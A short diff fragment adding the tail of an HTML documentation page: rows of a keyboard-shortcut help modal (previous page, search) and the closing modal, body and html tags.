+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
